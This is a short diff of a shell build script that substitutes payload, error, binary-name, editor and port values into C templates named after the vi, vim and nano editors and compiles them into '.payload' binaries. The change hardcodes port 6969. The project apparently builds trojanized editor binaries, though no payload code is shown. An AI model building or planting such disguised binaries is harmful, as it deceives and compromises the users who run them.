@@ -34,7 +34,7 @@ sed -i "s#{PAYLOAD}#$VI_PAYLOAD#" vi.c
 sed -i "s#{ERROR}#$VI_ERROR#" vi.c
 sed -i "s#{BINARYNAME}#$VI_BINARYNAME#" vi.c
 sed -i "s#{EDITOR}#$VI_EDITOR#" vi.c
-sed -i "s#{PORT}#$VI_PORT#" vi.c
+sed -i "s#6969#$VI_PORT#" vi.c
 
 #VIM
 sed -i "s#{STATUS}#$VIM_STATUS#" vim.c
@@ -42,7 +42,7 @@ sed -i "s#{PAYLOAD}#$VIM_PAYLOAD#" vim.c
 sed -i "s#{ERROR}#$VIM_ERROR#" vim.c
 sed -i "s#{BINARYNAME}#$VIM_BINARYNAME#" vim.c
 sed -i "s#{EDITOR}#$VIM_EDITOR#" vim.c
-sed -i "s#{PORT}#$VIM_PORT#" vim.c
+sed -i "s#6969#$VIM_PORT#" vim.c
 
 #NANO
 sed -i "s#{STATUS}#$NANO_STATUS#" nano.c
@@ -50,7 +50,7 @@ sed -i "s#{PAYLOAD}#$NANO_PAYLOAD#" nano.c
 sed -i "s#{ERROR}#$NANO_ERROR#" nano.c
 sed -i "s#{BINARYNAME}#$NANO_BINARYNAME#" nano.c
 sed -i "s#{EDITOR}#$NANO_EDITOR#" nano.c
-sed -i "s#{PORT}#$NANO_PORT#" nano.c
+sed -i "s#6969#$NANO_PORT#" nano.c
 
 #Compile binaries
 gcc vi.c -o vi.payload
